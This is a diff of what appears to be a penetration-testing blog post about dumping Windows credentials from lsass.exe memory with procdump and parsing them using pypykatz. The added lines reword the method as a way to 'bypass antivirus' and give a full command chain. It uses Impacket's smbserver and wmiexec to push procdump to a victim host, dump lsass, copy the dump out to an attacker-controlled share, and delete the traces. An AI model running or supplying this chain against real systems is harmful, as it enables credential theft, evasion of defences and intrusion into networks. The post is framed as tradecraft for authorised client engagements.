@@ -2,7 +2,7 @@
 published: true
 comments: true
 ---
-I rarely use Mimikatz for more than parsing memory dumps of lsass.exe taken with procdump64.exe. I'm just not going to risk running Mimikatz from CrackMapExec or uploading Mimikatz to the client's environment when I can fly under the radar by using wmiexec.py from Impacket to upload procdump64.exe, run the command to make a dump file from lsass.exe, and download it to be processed offline using Mimikatz on a system that I control. If this sounds like a lot of extra steps, it is. This post is about using a Python3 library to save yourself some work when processing those lsass.exe dump file to get credentials.
+I rarely use Mimikatz for more than parsing memory dumps of lsass.exe taken with procdump64.exe. I'm just not going to risk running Mimikatz from CrackMapExec or uploading Mimikatz to the client's environment when I can bypass antivirus by using wmiexec.py from Impacket to upload procdump64.exe, run the command to make a dump file from lsass.exe, and download it to be processed offline using Mimikatz on a system that I control. If this sounds like a lot of extra steps, it is. This post is about using a Python3 library to save yourself some work when processing those lsass.exe dump file to get credentials.
 
 ## About pypykatz
 
@@ -71,4 +71,14 @@ pypykatz live lsa
 
 Instead of running wmiexec with multiple commands to upload procdump, dump lsass.exe, download the dump file, and copy that over to a Windows host to use Mimikatz: 
 
-Write a script to include Impacket and run the commands from start to finish and dump creds and grep credentials from the output. Stay tuned for an upcoming script that I have in the works that will do all of the above in one go.
+Install pypykatz:
+`pip3 install pypykatz`
+
+Run Impacket smbserver.py:
+`./smbserver.py -smb2support <share name> <share path with procdump64.exe>`
+
+Run Impacket wmiexec.py:
+`./wmiexec.py <domain>/<username>:<password>@<Victim IP> 'copy \\<Attacker IP>\<share>\procdump64.exe . & procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp & copy lsass.dmp \\<Attacker IP>\<share>\ & del lsass.dmp & del procdump64.exe'`
+
+Dump creds from lsass.dmp:
+`pypykatz minidump lsass.dmp`
